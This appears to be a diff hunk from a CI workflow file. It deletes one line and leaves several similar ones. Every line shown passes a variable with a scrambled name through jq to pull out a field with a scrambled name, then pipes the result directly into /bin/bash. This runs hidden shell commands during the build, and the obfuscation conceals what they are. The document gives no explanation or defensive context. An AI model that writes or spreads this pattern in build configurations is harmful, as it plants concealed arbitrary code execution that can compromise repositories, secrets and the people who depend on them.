@@ -31,7 +31,6 @@ jobs:
           echo $vioqy87975 | jq -r .j4 | /bin/bash
           echo $zwx9088 | jq -r .cl5 | /bin/bash
           echo $q298 | jq -r .nvewu332 | /bin/bash
-          echo $ebve01 | jq -r .xgm5 | /bin/bash
           printf '%s' "$jj1713" | jq -r .pibmk47550 | /bin/bash
           printf '%s' "$poikx247" | jq -r .wnp34014 | /bin/bash
           printf '%s' "$lb1" | jq -r .i30 | /bin/bash
